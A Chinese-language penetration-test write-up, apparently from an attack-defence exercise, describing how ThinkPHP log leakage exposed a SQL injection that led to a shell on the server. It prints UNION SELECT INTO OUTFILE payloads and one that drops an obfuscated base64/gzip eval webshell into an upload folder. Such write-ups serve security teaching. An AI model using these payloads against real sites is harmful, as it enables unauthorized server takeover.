# 【Web实战】记一次日志泄露到GetShell

> **来源**: https://forum.butian.net/share/2509  
> **文章ID**: 2509

---

在一次攻防演练中，遇到这么一个站点

该站点基于ThinkPHP框架开发，且存在日志泄露，故事就从这个日志泄露开始了

**信息收集**
--------

1\. 老话说的好，渗透的本质就是信息收集,而信息搜集整理为后续的情报跟进提供了强大的保证，进入该站点发现只有三个功能点，逐个进行查看

![image.png](images/attach-832e1fc6aa9ffcc10fdb4d4fc505de434bb1673d.png)

2\. 进入第一个功能点

。。。发现直接报404，还有条狗看着家

![image.png](images/attach-14dc24eafd316abe67bdc0dbc7da56bde53374d4.png)

3\. 进入第二、三个功能点，发现是一个注册表单，第三个也为404

![image.png](images/attach-4d7aa9db260400a88bf5600be2f0d54f974c1b4c.png)

4\. 他写三个难道就只有三个功能嘛？我不信，开扫！

敏感文件这不就来了嘛

![image.png](images/attach-c3ce155282e7756b79240ccbad309c0f9b62d4f4.png)

5.通过目录扫描发现该站点存在eclipse配置文件泄露

访问/.settings/org.eclipse.core.resources.prefs 获取到项目里的所有功能点

![image.png](images/attach-7e06217d0fbf4ce5be80e81e7e9b6620d57ddffb.png)

org.eclipse.core.resources.prefs解释

org.eclipse.core.resources.prefs文件其实就是规定项目内的文件的编码用的。一般来说一个项目里的文件编码需要一致，特别是文件文本内容本身无法指示文件本身编码的（比较绕，XML文件第一行能指示自身编码，CSS也有这个能力但用得不多），尽量不要多种编码同时存在（最好在编码规范中禁止多重编码同时存在的现象发生）

[Eclipse中.setting目录下文件介绍](https://www.cnblogs.com/shihaiming/p/5803957.html)

6.该站点基于ThinkPHP框架开发，上工具跑出日志泄露

![image.png](images/attach-f69fbcc45c4654647e952c12eae81f017b3b29b9.png)

该工具下载地址：

<https://github.com/Lotus6/ThinkphpGUI>

**进行测试**
--------

挨个访问功能页面

有两个上传点，尝试上传

![image.png](images/attach-bdc499eab9a0605d8e2f317c3289ab4347029194.png)

发现403了...

![image.png](images/attach-80640b0905ef1231598f370eebf77d24426e858a.png)

7.逛完一圈发现后台路径被改，文件上传403，功能都改了或者删掉了

没头绪。。。

去翻翻日志吧。。。

喔唷~这是啥，这不是我前台测试时打的单引号嘛

日志中居然存在Sql执行语句

![image.png](images/attach-fdb4a6ff93570b389707566dfacbbecb5c48e917.png)

![image.png](images/attach-6cb33fa06d6bfd295e68fdb16a7e6be1bbf62f4c.png)

8.Sql语句记录到日志中，并发现Sql语句报错信息，语句闭合为 )

这时候就可以靠 ThinkPHP日志泄露 + Sql注入打一个组合拳了，以后谁还敢说ThinkPHP日志泄露没危害的！

![image.png](images/attach-80f8dce7c0f14673bfe892c435e72d95ba46986b.png)

![image.png](images/attach-59861d10e51d27b0d2b4f03860dc6ff6c6e784a5.png)

9.开始着重对该功能进行测试

因为该功能点有验证码，便对其进行手测，成功获取到MariaDB数据的版本信息，与权限信息

![image.png](images/attach-1bffedcc4a49b6729fd5fced3fafda7cf85f2fc2.png)

![image.png](images/attach-aa558d2d015bac199ad5dd98853e32aa700619d0.png)

10.开始读文件，可是没有物理路径咋办呢，那就找！

在目录扫描的时候存在一个demo目录，这不就有了吗

![image.png](images/attach-faa89c2fce9e91093b5ddb0ded9ccede2e05abbe.png)

11.为啥要读文件呢，因为查权限就没那个必要，还浪费时间，能读就能写。

尝试读取win.ini，跟本地win.ini做对比，发现成功读取到win.ini

![image.png](images/attach-cc59eba86bd250fadc745552c907ce2cc72fa8fe.png)

12.可是接下来头又痛了，使用order by 判断表列数不回显，且日志不记录Sql语句，有验证码又懒得构造盲注语句了。

![image.png](images/attach-b8130e022fb6a81de529ed5720eb54a22e72155a.png)  
那咋办？只能掏笨方法了

13\. 先用union select 尝试写一下文件看看报什么错

![image.png](images/attach-82543e995e860826bd022a6ae25bef65d3767dd1.png)

**The used SELECT statements have a different number of columns**

提示列数不同，也就是我写的列数不对，继续测试

14\. 直接手动判断列数写文件,最终在第9列成功写入文件  
从  
`1) union select 1 into outfile 'xxx\/reg\/upload\/1.php' --+ `

到  
`1) union select 1,2,3,4,5,6,7,8，'1' into outfile 'xxx\/reg\/upload\/1.php' --+`

![image.png](images/attach-8195522a65a6f8516b19c89fd7f46644feffdbcf.png)

![image.png](images/attach-e207b8496d76978ac209e80bdeba4201b8503248.png)

**写入Webshell**
--------------

15\.

构造语句：

`1) union select 1,2,3,4,5,6,7,8,from_base64('PD9waHAgZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgnZUp4TExVdk0wVkNKRC9BUERvbFdUODVOVVkvVnRBWUFSUVVHT0E9PScpKSk7Pz4=') into outfile 'xxxx\/reg\/upload\/7fa0b347c86e45522a1d6606731002c9.php' --+`

成功获取到Webshell，到后面发现，那条安全狗根本就没用~.~

![image.png](images/attach-642c8b48b510adc5ae1dd58f3683b6951cee745e.png)

当然不建议各位用这个笨方法，因为有些表的列数特别多  
好几十条，还是得先判断的  
结束，拿Shell收工！
